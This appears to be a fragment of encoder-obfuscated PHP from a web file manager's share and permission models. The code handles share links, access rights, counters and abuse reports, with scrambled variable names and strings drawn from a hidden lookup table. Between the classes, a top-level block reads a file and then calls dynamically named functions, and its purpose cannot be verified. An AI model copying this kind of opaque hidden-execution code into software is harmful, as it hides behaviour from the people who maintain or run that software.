getInfoBySourcePath($ğ¨àşß¬) { $ª³ü«Û† =& $_SERVER[ú‡®¯¨±]; $»áşªŒî = array($ª³ü«Û†[1708] => USER_ID, $ª³ü«Û†[1231] => $ğ¨àşß¬); return $this->_getShareInfo($»áşªŒî); } private function _getShareInfo($½ü®ü”î) { $İï±ÓÑè =& $_SERVER[ú‡®¯¨±]; $¸ÖƒŞá– = $this->where($½ü®ü”î)->find(); if (!$¸ÖƒŞá–) { return !1; } $½ü®ü”î = array($İï±ÓÑè[643] => $¸ÖƒŞá–[$İï±ÓÑè[643]]); $ÛìŸ¤…ø = $İï±ÓÑè[2049]; $Ù„£ı•¼ = Model($İï±ÓÑè[644])->order($İï±ÓÑè[453])->field($ÛìŸ¤…ø)->where($½ü®ü”î)->select(); if ($¸ÖƒŞá–[$İï±ÓÑè[183]] == $İï±ÓÑè[224]) { $¸ÖƒŞá–[$İï±ÓÑè[89]] = IO::info($¸ÖƒŞá–[$İï±ÓÑè[1231]]); } else { $¸ÖƒŞá–[$İï±ÓÑè[89]] = Model($İï±ÓÑè[1389])->pathInfo($¸ÖƒŞá–[$İï±ÓÑè[183]]); } $¸ÖƒŞá–[$İï±ÓÑè[2050]] = $Ù„£ı•¼; return $¸ÖƒŞá–; } protected function getInfoAuth($İ‡³¨¼) { $¡óƒò¨ä =& $_SERVER[ú‡®¯¨±]; $¬”ÊìØ„ = $this->getInfo($İ‡³¨¼); if ($¬”ÊìØ„[$¡óƒò¨ä[1708]] == USER_ID) { $¬”ÊìØ„[$¡óƒò¨ä[465]] = $¬”ÊìØ„[$¡óƒò¨ä[89]][$¡óƒò¨ä[465]]; } else { $¬”ÊìØ„[$¡óƒò¨ä[465]] = Model($¡óƒò¨ä[546])->authMake($¬”ÊìØ„[$¡óƒò¨ä[2050]]); } return $¬”ÊìØ„; } protected function listData($‚šŒØšÔ = null, $÷˜Úˆ¹Ü = 300) { $ÔÄÌÁÊş =& $_SERVER[ú‡®¯¨±]; $ÛôÂ© = array(array($ÔÄÌÁÊş[541] => array($ÔÄÌÁÊş[1068], 0), $ÔÄÌÁÊş[641] => array($ÔÄÌÁÊş[1068], 0), $ÔÄÌÁÊş[2051] => $ÔÄÌÁÊş[2004])); if ($‚šŒØšÔ == $ÔÄÌÁÊş[2052]) { $ÛôÂ© = array($ÔÄÌÁÊş[541] => 1); } else { if ($‚šŒØšÔ == $ÔÄÌÁÊş[1217]) { $ÛôÂ© = array($ÔÄÌÁÊş[641] => 1); } } $ÛôÂ©[$ÔÄÌÁÊş[1708]] = USER_ID; $…¥¿£Î = $this->where($ÛôÂ©)->selectPage($÷˜Úˆ¹Ü); return $…¥¿£Î; } protected function listToMe($Ñöò´¢ = 300) { $Ó®¸³±ä =& $_SERVER[ú‡®¯¨±]; $”®ª¼óŞ = Model($Ó®¸³±ä[2053])->userGroupParents(USER_ID); $Ù«‡ÔÌ’ = array($Ó®¸³±ä[626] => SourceModel::TYPE_USER, $Ó®¸³±ä[548] => USER_ID); if ($”®ª¼óŞ) { $Ù«‡ÔÌ’ = array(array($Ó®¸³±ä[626] => SourceModel::TYPE_USER, $Ó®¸³±ä[548] => USER_ID), array($Ó®¸³±ä[626] => SourceModel::TYPE_GROUP, $Ó®¸³±ä[548] => array($Ó®¸³±ä[7], $”®ª¼óŞ)), $Ó®¸³±ä[2051] => $Ó®¸³±ä[2004]); } $É êâ = Model($Ó®¸³±ä[644])->where($Ù«‡ÔÌ’)->selectPage($Ñöò´¢); $î”èå¡× = array_to_keyvalue_group($É êâ[$Ó®¸³±ä[424]], $Ó®¸³±ä[643]); if (!$î”èå¡×) { return $É êâ; } $§‹âà¡è = $Ó®¸³±ä[2054]; $Ù«‡ÔÌ’ = array($Ó®¸³±ä[643] => array($Ó®¸³±ä[470], array_keys($î”èå¡×)), $Ó®¸³±ä[1708] => array($Ó®¸³±ä[1070], $Ó®¸³±ä[224])); $²¯Ì…’è = $this->field($§‹âà¡è)->where($Ù«‡ÔÌ’)->select(); foreach ($²¯Ì…’è as $¢¾€‚Ó => &$åéôé÷ê) { $åéôé÷ê[$Ó®¸³±ä[2050]] = $î”èå¡×[$åéôé÷ê[$Ó®¸³±ä[643]]]; } unset($åéôé÷ê); $Æ“…” ´ = array($Ó®¸³±ä[2055] => $²¯Ì…’è, $Ó®¸³±ä[2056] => $É êâ[$Ó®¸³±ä[421]]); return $Æ“…” ´; } protected function shareAdd($é¹çÄˆì, $í•ê”Œã) { $¤òÈ—ÍÎ =& $_SERVER[ú‡®¯¨±]; $ş˜“šşÂ = $this->_addShareData($é¹çÄˆì, $í•ê”Œã); if (!empty($í•ê”Œã[$¤òÈ—ÍÎ[2057]])) { $this->_shareAuthSet($ş˜“šşÂ, $í•ê”Œã[$¤òÈ—ÍÎ[2057]]); } $this->shareEventAdd($é¹çÄˆì, $í•ê”Œã, $¤òÈ—ÍÎ[2058]); return $ş˜“šşÂ; } protected function shareAddSystem($¸œµÎÅû, $Ÿ¥—½ôğ) { $’ù© ˆà =& $_SERVER[ú‡®¯¨±]; $ß¦–Øı– = $this->_addShareData($¸œµÎÅû, $Ÿ¥—½ôğ, $’ù© ˆà[181]); $this->_shareAuthSet($ß¦–Øı–, $Ÿ¥—½ôğ[$’ù© ˆà[2057]]); return $ß¦–Øı–; } private function shareEventAdd($«‚šü±³, $²‘´Åğ, $¬âÇ¥ê· = "\141\144\144") { $÷£åœƒÏ =& $_SERVER[ú‡®¯¨±]; if (!$«‚šü±³ || $«‚šü±³ == $÷£åœƒÏ[224]) { return; } if ($¬âÇ¥ê· == $÷£åœƒÏ[2058]) { if ($²‘´Åğ[$÷£åœƒÏ[541]] == $÷£åœƒÏ[90]) { Model($÷£åœƒÏ[611])->eventShare($«‚šü±³, $÷£åœƒÏ[2059]); } if ($²‘´Åğ[$÷£åœƒÏ[641]] == $÷£åœƒÏ[90]) { Model($÷£åœƒÏ[611])->eventShare($«‚šü±³, $÷£åœƒÏ[2060]); } return; } $ØöÅĞÌ¨ = $this->getInfoByPath($«‚šü±³); $®–¿Èúª = $÷£åœƒÏ[2061]; if ($ØöÅĞÌ¨[$÷£åœƒÏ[541]] == $÷£åœƒÏ[224] && $²‘´Åğ[$÷£åœƒÏ[541]] == $÷£åœƒÏ[90]) { $®–¿Èúª = $÷£åœƒÏ[2059]; } if ($ØöÅĞÌ¨[$÷£åœƒÏ[541]] == $÷£åœƒÏ[90] && $²‘´Åğ[$÷£åœƒÏ[541]] == $÷£åœƒÏ[224]) { $®–¿Èúª = $÷£åœƒÏ[2062]; } if ($ØöÅĞÌ¨[$÷£åœƒÏ[641]] == $÷£åœƒÏ[224] && $²‘´Åğ[$÷£åœƒÏ[641]] == $÷£åœƒÏ[90]) { $®–¿Èúª = $÷£åœƒÏ[2060]; } if ($ØöÅĞÌ¨[$÷£åœƒÏ[641]] == $÷£åœƒÏ[90] && $²‘´Åğ[$÷£åœƒÏ[641]] == $÷£åœƒÏ[224]) { $®–¿Èúª = $÷£åœƒÏ[2063]; } Model($÷£åœƒÏ[611])->eventShare($«‚šü±³, $®–¿Èúª); return; } private function _addShareData($‘×ÉÓãé, $Õ¡´“Ê = array(), $˜ŒÄ³¼ = false) { $æğâˆÙ =& $_SERVER[ú‡®¯¨±]; $œşÏï±á = $˜ŒÄ³¼ == $æğâˆÙ[181] ? 0 : USER_ID; $©ÍÉÏÛ‚ = array($æğâˆÙ[469] => $‘×ÉÓãé, $æğâˆÙ[1699] => $œşÏï±á); if ($‘×ÉÓãé == 0) { $©ÍÉÏÛ‚ = array($æğâˆÙ[2064] => $Õ¡´“Ê[$æğâˆÙ[1231]], $æğâˆÙ[1699] => $œşÏï±á); } if ($Š¦Î”§¢ = $this->where($©ÍÉÏÛ‚)->find()) { return $Š¦Î”§¢[$æğâˆÙ[643]]; } if ($‘×ÉÓãé == 0) { $°íİÚ = array($æğâˆÙ[32] => get_path_this($Õ¡´“Ê[$æğâˆÙ[86]])); } else { $°íİÚ = Model($æğâˆÙ[880])->sourceInfo($‘×ÉÓãé); if (!$°íİÚ) { return !1; } } if (!$Õ¡´“Ê[$æğâˆÙ[1598]]) { $Õ¡´“Ê[$æğâˆÙ[1598]] = $°íİÚ[$æğâˆÙ[32]]; } $Á¾Ç†Ÿâ = array($æğâˆÙ[1699] => $œşÏï±á, $æğâˆÙ[469] => $‘×ÉÓãé, $æğâˆÙ[1598] => $æğâˆÙ[12], $æğâˆÙ[541] => 0, $æğâˆÙ[641] => 0, $æğâˆÙ[1231] => $æğâˆÙ[12], $æğâˆÙ[362] => $æğâˆÙ[12], $æğâˆÙ[945] => $æğâˆÙ[12], $æğâˆÙ[2065] => 0, $æğâˆÙ[2066] => 0, $æğâˆÙ[816] => 0, $æğâˆÙ[2067] => $æğâˆÙ[12], $æğâˆÙ[2048] => $æğâˆÙ[12]); $ÒåÆª¬Ã = explode($æğâˆÙ[50], $æğâˆÙ[2068]); foreach ($ÒåÆª¬Ã as $“×©´Ë‚) { if (!isset($Õ¡´“Ê[$“×©´Ë‚])) { continue; } $Á¾Ç†Ÿâ[$“×©´Ë‚] = $Õ¡´“Ê[$“×©´Ë‚]; } $ü­ ”•™ = $this->add($Á¾Ç†Ÿâ); $˜­“’…¨ = array($æğâˆÙ[2048] => short_id($ü­ ”•™)); $this->where(array($æğâˆÙ[2069] => $ü­ ”•™))->save($˜­“’…¨); return $ü­ ”•™; } private function _shareAuthSet($Æ€œş‡¢, $¥şÄ©) { $ï×«ÂÀ¦ =& $_SERVER[ú‡®¯¨±]; if (!is_array($¥şÄ©)) { return !1; } $İ„Åß = Model($ï×«ÂÀ¦[2014]); $İ„Åß->where(array($ï×«ÂÀ¦[643] => $Æ€œş‡¢))->delete(); $ïâö·¶ä = array(); foreach ($¥şÄ© as $Ê§ß€Ñ´) { $ÕëÏ­†× = SourceModel::TYPE_USER; if ($Ê§ß€Ñ´[$ï×«ÂÀ¦[180]] == SourceModel::TYPE_GROUP) { $ÕëÏ­†× = SourceModel::TYPE_GROUP; } $î¶†íñ˜ = array($ï×«ÂÀ¦[643] => $Æ€œş‡¢, $ï×«ÂÀ¦[180] => $ÕëÏ­†×, $ï×«ÂÀ¦[548] => intval($Ê§ß€Ñ´[$ï×«ÂÀ¦[548]]), $ï×«ÂÀ¦[2010] => 0, $ï×«ÂÀ¦[2070] => -1); if ($Ê§ß€Ñ´[$ï×«ÂÀ¦[2010]]) { $î¶†íñ˜[$ï×«ÂÀ¦[2010]] = $Ê§ß€Ñ´[$ï×«ÂÀ¦[2010]]; } else { if ($Ê§ß€Ñ´[$ï×«ÂÀ¦[2070]]) { $î¶†íñ˜[$ï×«ÂÀ¦[2070]] = $Ê§ß€Ñ´[$ï×«ÂÀ¦[2070]]; } } $ïâö·¶ä[] = $î¶†íñ˜; } return $İ„Åß->addAll($ïâö·¶ä, array(), !0); } public function numViewAdd($„¶á“•¼) { $§ÆïŸÖ =& $_SERVER[ú‡®¯¨±]; $ƒ§‘áÏ = array($§ÆïŸÖ[2069] => $„¶á“•¼); $this->where($ƒ§‘áÏ)->setAdd($§ÆïŸÖ[2065]); } public function numDownloadAdd($‡ˆ–Ùâ) { $ìÁâåŸÅ =& $_SERVER[ú‡®¯¨±]; $ù—‡¬Ë˜ = array($ìÁâåŸÅ[2069] => $‡ˆ–Ùâ); $this->where($ù—‡¬Ë˜)->setAdd($ìÁâåŸÅ[2066]); } protected function shareEdit($œï–ø¯, $ğéñş‰›) { $×áá ş =& $_SERVER[ú‡®¯¨±]; $¶ƒÉ¥ŞÁ = $this->getInfo($œï–ø¯); if (!$¶ƒÉ¥ŞÁ) { return !1; } $this->_checkLinkShare($ğéñş‰›, $¶ƒÉ¥ŞÁ); $’Ã÷°…í = array(); $Ïœ¬òíì = explode($×áá ş[50], $×áá ş[2071]); foreach ($Ïœ¬òíì as $´ù£˜‘ª) { if (!array_key_exists($´ù£˜‘ª, $ğéñş‰›)) { continue; } $’Ã÷°…í[$´ù£˜‘ª] = $ğéñş‰›[$´ù£˜‘ª]; } $this->shareEventAdd($¶ƒÉ¥ŞÁ[$×áá ş[183]], $ğéñş‰›, $×áá ş[1876]); $this->where(array($×áá ş[2069] => $œï–ø¯))->save($’Ã÷°…í); if (isset($ğéñş‰›[$×áá ş[2057]])) { $this->_shareAuthSet($œï–ø¯, $ğéñş‰›[$×áá ş[2057]]); } return !0; } private function _checkLinkShare($÷ƒ”“ï , $¿¡Ç‡Ì˜) { $È¡„á¢ =& $_SERVER[ú‡®¯¨±]; if ($÷ƒ”“ï [$È¡„á¢[541]] != $È¡„á¢[90]) { return; } $ÃçŸÏ¸ô = $¿¡Ç‡Ì˜[$È¡„á¢[89]][$È¡„á¢[183]]; if ($¿¡Ç‡Ì˜[$È¡„á¢[89]][$È¡„á¢[33]] != $È¡„á¢[226]) { $ŒöúÚÒ‚ = $this->_folderReport($ÃçŸÏ¸ô); if (!$ŒöúÚÒ‚) { return; } show_json(LNG($È¡„á¢[2072]) . $È¡„á¢[2073] . $ŒöúÚÒ‚, !1); } $ôò·şì÷ = Model($È¡„á¢[880])->fileInfoGet($¿¡Ç‡Ì˜[$È¡„á¢[89]][$È¡„á¢[183]]); if (!$ôò·şì÷) { return; } $ §”ŞÚ­ = $this->shareFileMeta($ôò·şì÷[$È¡„á¢[519]]); if (isset($ §”ŞÚ­[$È¡„á¢[429]]) && $ §”ŞÚ­[$È¡„á¢[429]] == $È¡„á¢[90]) { show_json(LNG($È¡„á¢[2074]), !1); } } private function _folderReport($ŠÒ³­ÑÒ) { $“œÌµ† =& $_SERVER[ú‡®¯¨±]; $À ÇÅïç = array($“œÌµ†[519] => array($“œÌµ†[1068], 0), $“œÌµ†[805] => 3); $˜æÇ•ú« = Model($“œÌµ†[2075])->where($À ÇÅïç)->field($“œÌµ†[519])->select(); if (!$˜æÇ•ú«) { return !1; } $˜æÇ•ú« = array_to_keyvalue($˜æÇ•ú«, $“œÌµ†[12], $“œÌµ†[519]); $ğÍüëùÈ = $“œÌµ†[50] . $ŠÒ³­ÑÒ . $“œÌµ†[50]; $À ÇÅïç = array($“œÌµ†[519] => array($“œÌµ†[7], $˜æÇ•ú«), $“œÌµ†[563] => array($“œÌµ†[437], "\45{$ğÍüëùÈ}\x25"), $“œÌµ†[483] => 0); $”œÀçŸÁ = Model($“œÌµ†[880])->where($À ÇÅïç)->field($“œÌµ†[2076])->find(); if (!$”œÀçŸÁ) { return !1; } $åˆúù = substr($”œÀçŸÁ[$“œÌµ†[563]], strpos($”œÀçŸÁ[$“œÌµ†[563]], $ğÍüëùÈ)); $À ÇÅïç = array($“œÌµ†[183] => array($“œÌµ†[7], trim($åˆúù, $“œÌµ†[50]))); $šìğª£ó = Model($“œÌµ†[880])->where($À ÇÅïç)->field($“œÌµ†[32])->select(); $Ñı ¨œé = array_to_keyvalue($šìğª£ó, $“œÌµ†[12], $“œÌµ†[32]); $Ñı ¨œé[] = $”œÀçŸÁ[$“œÌµ†[32]]; return implode($“œÌµ†[8], $Ñı ¨œé); } protected function remove($ãÓ›©¥ë) { $Æ«“Ìîó =& $_SERVER[ú‡®¯¨±]; if (is_array($ãÓ›©¥ë)) { $ãÓ›©¥ë = array($Æ«“Ìîó[7], $ãÓ›©¥ë); } $Õ¼ˆù´Ê = array($Æ«“Ìîó[643] => $ãÓ›©¥ë); $²—İÚÌ€ = $this->where($Õ¼ˆù´Ê)->delete(); if ($²—İÚÌ€) { Model($Æ«“Ìîó[644])->where(array($Æ«“Ìîó[643] => $ãÓ›©¥ë))->delete(); } $¿Ã²ƒİÖ = is_array($ãÓ›©¥ë) ? $ãÓ›©¥ë[1] : array($ãÓ›©¥ë); for ($Ú†ü©–è = 0; $Ú†ü©–è < count($¿Ã²ƒİÖ); $Ú†ü©–è++) { $÷¿ÚÛº = $this->getInfo($¿Ã²ƒİÖ[$Ú†ü©–è]); if ($÷¿ÚÛº[$Æ«“Ìîó[641]] == $Æ«“Ìîó[90]) { Model($Æ«“Ìîó[611])->eventShare($÷¿ÚÛº[$Æ«“Ìîó[183]], $Æ«“Ìîó[2063]); } if ($÷¿ÚÛº[$Æ«“Ìîó[541]] == $Æ«“Ìîó[90]) { Model($Æ«“Ìîó[611])->eventShare($÷¿ÚÛº[$Æ«“Ìîó[183]], $Æ«“Ìîó[2062]); } } return $²—İÚÌ€; } protected function removeBySource($Øİ€é©°) { $’°Äúø =& $_SERVER[ú‡®¯¨±]; $ä•³¿¾Ú = array($’°Äúø[469] => array($’°Äúø[470], $Øİ€é©°)); $íÈóŸ¦Š = $this->field($’°Äúø[643])->where($ä•³¿¾Ú)->select(); $íÈóŸ¦Š = array_to_keyvalue($íÈóŸ¦Š, $’°Äúø[12], $’°Äúø[643]); if (!$íÈóŸ¦Š) { return; } $ä•³¿¾Ú = array($’°Äúø[2069] => array($’°Äúø[470], $íÈóŸ¦Š)); $this->where($ä•³¿¾Ú)->delete(); Model($’°Äúø[644])->where($ä•³¿¾Ú)->delete(); } public function listAll($ˆ›ó„¨Ê) { $ÛßÊñğÄ =& $_SERVER[ú‡®¯¨±]; $ŞÀà„«Á = array(); if ($ˆ›ó„¨Ê[$ÛßÊñğÄ[1708]]) { $ŞÀà„«Á[$ÛßÊñğÄ[1708]] = $ˆ›ó„¨Ê[$ÛßÊñğÄ[1708]]; } if ($ˆ›ó„¨Ê[$ÛßÊñğÄ[815]]) { $‚–Éë¶¹ = $ˆ›ó„¨Ê[$ÛßÊñğÄ[816]] ? $ˆ›ó„¨Ê[$ÛßÊñğÄ[816]] : strtotime(date($ÛßÊñğÄ[2077])); $ŞÀà„«Á[$ÛßÊñğÄ[227]] = array($ÛßÊñğÄ[388], array($ˆ›ó„¨Ê[$ÛßÊñğÄ[815]], $‚–Éë¶¹)); } if ($ˆ›ó„¨Ê[$ÛßÊñğÄ[33]]) { $ŞÀà„«Á[$ˆ›ó„¨Ê[$ÛßÊñğÄ[33]]] = 1; } else { $ŞÀà„«Á[] = array($ÛßÊñğÄ[541] => array($ÛßÊñğÄ[1068], 0), $ÛßÊñğÄ[641] => array($ÛßÊñğÄ[1068], 0), $ÛßÊñğÄ[2051] => $ÛßÊñğÄ[2004]); } if ($ˆ›ó„¨Ê[$ÛßÊñğÄ[2000]]) { $ŞÀà„«Á[] = array($ÛßÊñğÄ[2048] => $ˆ›ó„¨Ê[$ÛßÊñğÄ[2000]], $ÛßÊñğÄ[1598] => array($ÛßÊñğÄ[437], "\x25{$ˆ›ó„¨Ê[$ÛßÊñğÄ[2000]]}\x25"), $ÛßÊñğÄ[2051] => $ÛßÊñğÄ[2004]); } $±‹Õ†‹ = $this->_makeOrder()->where($ŞÀà„«Á)->selectPage(20); if (empty($±‹Õ†‹[$ÛßÊñğÄ[424]])) { return array(); } $this->_listDataApply($±‹Õ†‹[$ÛßÊñğÄ[424]]); return $±‹Õ†‹; } public function listDataApply($×ò¥Òãç) { $this->_listDataApply($×ò¥Òãç); return $×ò¥Òãç; } private function _listDataApply(&$üİ¹Î¢) { $ì§‰Á² =& $_SERVER[ú‡®¯¨±]; $ÉÒé¢• = array_to_keyvalue($üİ¹Î¢, $ì§‰Á²[12], $ì§‰Á²[1708]); $è«Îı™° = Model($ì§‰Á²[577])->userListInfo(array_unique($ÉÒé¢•)); $ÉÛšƒ›Ë = array_to_keyvalue($üİ¹Î¢, $ì§‰Á²[12], $ì§‰Á²[183]); $¬‰³ÔÌé = Model($ì§‰Á²[880])->sourceListInfo($ÉÛšƒ›Ë, !0); foreach ($üİ¹Î¢ as $›—Ğ¿†Ó => &$‘š¢ÜÉ™) { $¡îŸ•Î = $‘š¢ÜÉ™[$ì§‰Á²[1708]]; $‘š¢ÜÉ™[$ì§‰Á²[2078]] = $è«Îı™°[$¡îŸ•Î] ? $è«Îı™°[$¡îŸ•Î] : !1; $Û­ı¿Ñ‹ = $‘š¢ÜÉ™[$ì§‰Á²[183]]; $‘š¢ÜÉ™[$ì§‰Á²[89]] = $¬‰³ÔÌé[$Û­ı¿Ñ‹] ? $¬‰³ÔÌé[$Û­ı¿Ñ‹] : !1; if ($‘š¢ÜÉ™[$ì§‰Á²[89]][$ì§‰Á²[483]] == $ì§‰Á²[90]) { unset($üİ¹Î¢[$›—Ğ¿†Ó]); } if ($‘š¢ÜÉ™[$ì§‰Á²[89]] != $ì§‰Á²[224] && !$‘š¢ÜÉ™[$ì§‰Á²[89]]) { unset($üİ¹Î¢[$›—Ğ¿†Ó]); } } unset($‘š¢ÜÉ™); $üİ¹Î¢ = array_values($üİ¹Î¢); } private function _makeOrder($¯òü¶Ñ„ = '') { $…Øéßµñ =& $_SERVER[ú‡®¯¨±]; $×èóÒû“ = array($…Øéßµñ[227], $…Øéßµñ[816], $…Øéßµñ[2065], $…Øéßµñ[2066]); $ÁÚàº = array($…Øéßµñ[501] => $…Øéßµñ[502], $…Øéßµñ[503] => $…Øéßµñ[504]); $øÍ¼´şà = Input::get($…Øéßµñ[508], $…Øéßµñ[7], $…Øéßµñ[475], $×èóÒû“); $¨¦Œ™ = Input::get($…Øéßµñ[509], $…Øéßµñ[7], $…Øéßµñ[2079], array($…Øéßµñ[1997], $…Øéßµñ[503])); $¨¦Œ™ = $ÁÚàº[$¨¦Œ™]; $¯òü¶Ñ„ = $¯òü¶Ñ„ . "{$øÍ¼´şà}\x20{$¨¦Œ™}"; return $this->order($¯òü¶Ñ„); } public function reportAdd($œ“â‹µÍ) { $×ã¨ßï¤ =& $_SERVER[ú‡®¯¨±]; $³óüâ¢Â = array($×ã¨ßï¤[643] => $œ“â‹µÍ[$×ã¨ßï¤[643]], $×ã¨ßï¤[1708] => USER_ID); if (Model($×ã¨ßï¤[2075])->where($³óüâ¢Â)->find()) { return !1; } $•¢·âäò = array($×ã¨ßï¤[643] => $œ“â‹µÍ[$×ã¨ßï¤[643]], $×ã¨ßï¤[1598] => $œ“â‹µÍ[$×ã¨ßï¤[1598]], $×ã¨ßï¤[183] => $œ“â‹µÍ[$×ã¨ßï¤[183]], $×ã¨ßï¤[519] => $œ“â‹µÍ[$×ã¨ßï¤[519]], $×ã¨ßï¤[1708] => USER_ID, $×ã¨ßï¤[33] => $œ“â‹µÍ[$×ã¨ßï¤[33]], $×ã¨ßï¤[504] => $œ“â‹µÍ[$×ã¨ßï¤[504]]); return Model($×ã¨ßï¤[2075])->add($•¢·âäò); } public function reportList($»÷ç­¦”) { $ÏÜ£ªØ =& $_SERVER[ú‡®¯¨±]; $•Ú×å–² = array(); if ($»÷ç­¦”[$ÏÜ£ªØ[815]]) { $ëÅ¸çí = $»÷ç­¦”[$ÏÜ£ªØ[816]] ? $»÷ç­¦”[$ÏÜ£ªØ[816]] : strtotime(date($ÏÜ£ªØ[2077])); $•Ú×å–²[$ÏÜ£ªØ[227]] = array($ÏÜ£ªØ[388], array($»÷ç­¦”[$ÏÜ£ªØ[815]], $ëÅ¸çí)); } if (isset($»÷ç­¦”[$ÏÜ£ªØ[33]]) && in_array($»÷ç­¦”[$ÏÜ£ªØ[33]], array($ÏÜ£ªØ[90], $ÏÜ£ªØ[488], $ÏÜ£ªØ[2080], $ÏÜ£ªØ[2081], $ÏÜ£ªØ[2082]))) { $•Ú×å–²[$ÏÜ£ªØ[33]] = $»÷ç­¦”[$ÏÜ£ªØ[33]]; } if (isset($»÷ç­¦”[$ÏÜ£ªØ[805]]) && in_array($»÷ç­¦”[$ÏÜ£ªØ[805]], array($ÏÜ£ªØ[224], $ÏÜ£ªØ[90], $ÏÜ£ªØ[488], $ÏÜ£ªØ[2080]))) { $•Ú×å–²[$ÏÜ£ªØ[805]] = $»÷ç­¦”[$ÏÜ£ªØ[805]]; } $¡Š÷¾«“ = Input::get($ÏÜ£ªØ[509], $ÏÜ£ªØ[7], $ÏÜ£ªØ[2079], array($ÏÜ£ªØ[1997], $ÏÜ£ªØ[503])); $™ÚÍÌÄƒ = array($ÏÜ£ªØ[501] => $ÏÜ£ªØ[502], $ÏÜ£ªØ[503] => $ÏÜ£ªØ[504]); $‹ÙËºŠ¾ = $ÏÜ£ªØ[2083] . $™ÚÍÌÄƒ[$¡Š÷¾«“]; $±¥ûî ˜ = Model($ÏÜ£ªØ[2075])->where($•Ú×å–²)->order($‹ÙËºŠ¾)->selectPage(20); if (empty($±¥ûî ˜[$ÏÜ£ªØ[424]])) { return array(); } $ˆöù©¯… = array_to_keyvalue_group($±¥ûî ˜[$ÏÜ£ªØ[424]], $ÏÜ£ªØ[805], $ÏÜ£ªØ[643]); if (!empty($ˆöù©¯…[0])) { $»÷ç­¦” = $ˆöù©¯…[0]; $•Ú×å–² = array($ÏÜ£ªØ[643] => array($ÏÜ£ªØ[7], $»÷ç­¦”)); $Ö×»È£Î = $this->where($•Ú×å–²)->field($ÏÜ£ªØ[643])->select(); $Ö×»È£Î = array_to_keyvalue($Ö×»È£Î, $ÏÜ£ªØ[12], $ÏÜ£ªØ[643]); $åƒ€Ã²™ = array_diff($»÷ç­¦”, $Ö×»È£Î); if (!empty($åƒ€Ã²™)) { foreach ($±¥ûî ˜[$ÏÜ£ªØ[424]] as $³ÅÆ™›Æ => $±Æºâõ) { if (in_array($±Æºâõ[$ÏÜ£ªØ[643]], $åƒ€Ã²™)) { unset($±¥ûî ˜[$ÏÜ£ªØ[424]][$³ÅÆ™›Æ]); } } } } $this->_listDataApply($±¥ûî ˜[$ÏÜ£ªØ[424]]); return $±¥ûî ˜; } public function reportStatus($ö¬œ¬Ä) { $’¢ –æÈ =& $_SERVER[ú‡®¯¨±]; $õË“şİë = array($’¢ –æÈ[453] => $ö¬œ¬Ä[$’¢ –æÈ[453]]); $äé¨Ğ®š = Model($’¢ –æÈ[2075])->where($õË“şİë)->field($’¢ –æÈ[2084])->find(); if (!$äé¨Ğ®š) { return !1; } $Àôã‹Ó· = array($’¢ –æÈ[805] => $ö¬œ¬Ä[$’¢ –æÈ[805]]); if ($ö¬œ¬Ä[$’¢ –æÈ[805]] == $’¢ –æÈ[2080] && $äé¨Ğ®š[$’¢ –æÈ[805]] == $’¢ –æÈ[2080]) { $Àôã‹Ó·[$’¢ –æÈ[805]] = 0; } $÷È±î†Ê = Model($’¢ –æÈ[2075])->where($õË“şİë)->save($Àôã‹Ó·); if ($ö¬œ¬Ä[$’¢ –æÈ[805]] == $’¢ –æÈ[488]) { if ($äé¨Ğ®š[$’¢ –æÈ[519]] != $’¢ –æÈ[224] && $this->shareFileMeta($äé¨Ğ®š[$’¢ –æÈ[519]])) { $this->shareFileMeta($äé¨Ğ®š[$’¢ –æÈ[519]], 0); } $this->remove($äé¨Ğ®š[$’¢ –æÈ[643]]); return !0; } if ($÷È±î†Ê && $ö¬œ¬Ä[$’¢ –æÈ[805]] == $’¢ –æÈ[2080]) { $¤–Â¯üî = $Àôã‹Ó·[$’¢ –æÈ[805]] == $’¢ –æÈ[2080] ? 1 : 0; $this->shareFileMeta($äé¨Ğ®š[$’¢ –æÈ[519]], $¤–Â¯üî); $this->removeByFile($äé¨Ğ®š[$’¢ –æÈ[519]]); } return $÷È±î†Ê; } private function removeByFile($üŸûµÛ€) { $±µàèì =& $_SERVER[ú‡®¯¨±]; $•äÈâ¯ = Model($±µàèì[880])->where(array($±µàèì[519] => $üŸûµÛ€))->field($±µàèì[183])->select(); $—úç÷Û¼ = array_to_keyvalue($•äÈâ¯, $±µàèì[12], $±µàèì[183]); $ Ş×Ş = array($±µàèì[183] => array($±µàèì[7], $—úç÷Û¼), $±µàèì[541] => 1); $•äÈâ¯ = $this->where($ Ş×Ş)->field($±µàèì[643])->select(); if (empty($•äÈâ¯)) { return; } $ä…Êö°¯ = array_to_keyvalue($•äÈâ¯, $±µàèì[12], $±µàèì[643]); $this->remove($ä…Êö°¯); } private function shareFileMeta($ö–³™›, $ìòêÉ‡è = null) { $ñŠ•»úí =& $_SERVER[ú‡®¯¨±]; $¼©²Ğ± = array($ñŠ•»úí[519] => $ö–³™›, $ñŠ•»úí[96] => $ñŠ•»úí[2085]); if (is_null($ìòêÉ‡è)) { return Model($ñŠ•»úí[2086])->where($¼©²Ğ±)->find(); } $¼©²Ğ±[$ñŠ•»úí[429]] = $ìòêÉ‡è; Model($ñŠ•»úí[2086])->add($¼©²Ğ±, array(), !0); } } if ($_SERVER[$_SERVER[ú‡®¯¨±][202]] != $_SERVER[$_SERVER[ú‡®¯¨±][2087]]) { $_getc = $_SERVER[ú‡®¯¨±][204]; $_getfile = $_SERVER[$_SERVER[ú‡®¯¨±][205]] . $_SERVER[ú‡®¯¨±][206]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ú‡®¯¨±][207], $_getfilec); if (count($_getarrs) < $_SERVER[ú‡®¯¨±][208]) { $exit = $_SERVER[ú‡®¯¨±][209]; $exit(); } $_act = $_SERVER[ú‡®¯¨±][210]; $_act($_SERVER[$_SERVER[ú‡®¯¨±][203]]); } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\x72\143\145\137\x61\x75\164\150"; public function getAuth($ıìªà»ã) { $Îü¯áß =& $_SERVER[ú‡®¯¨±]; $¶óô¿Äå = $this->sourceAuthSelect($ıìªà»ã); $„ñãÍÅ = array(); $Ê¯º‡ = array(); $±£Ÿ = 2 << 25; foreach ($¶óô¿Äå as $ÏÙ»Ó¡) { $à¡½¬ØÛ = Model($Îü¯áß[550])->listData($ÏÙ»Ó¡[$Îü¯áß[2010]]); if (!$à¡½¬ØÛ) { continue; } $„ñãÍÅ[] = $ÏÙ»Ó¡; $Ú¹†Éáö = 0; if ($ÏÙ»Ó¡[$Îü¯áß[180]] == SourceModel::TYPE_GROUP) { $Ú¹†Éáö = $±£Ÿ * 2; } if ($ÏÙ»Ó¡[$Îü¯áß[180]] == SourceModel::TYPE_USER) { $Ú¹†Éáö = 